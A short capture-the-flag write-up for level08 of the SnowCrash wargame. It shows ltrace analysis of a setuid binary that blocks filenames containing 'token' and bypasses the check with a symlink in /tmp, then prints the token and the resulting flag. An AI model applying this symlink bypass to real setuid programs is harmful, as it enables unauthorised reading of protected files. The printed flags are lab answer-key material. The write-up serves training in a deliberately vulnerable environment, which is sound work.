# level08
## Introduction

Hack by symbol link to redirect target file to another destination.

## Observations

level08@SnowCrash:~$ ls
level08  token
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token


level08@SnowCrash:~$ ltrace ./level08 
__libc_start_main(0x8048554, 1, 0xbffff6e4, 0x80486b0, 0x8048720 <unfinished ...>
printf("%s [file to read]\n", "./level08"./level08 [file to read]
)   = 25
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff6d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                     = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
) = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$ 




## Final solution
### Get the token
level08@SnowCrash:~$ ln -s ~/token /tmp/link
level08@SnowCrash:~$ ./level08 /tmp/link
quif5eloekouj29ke0vouxean

### Get the flag
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f




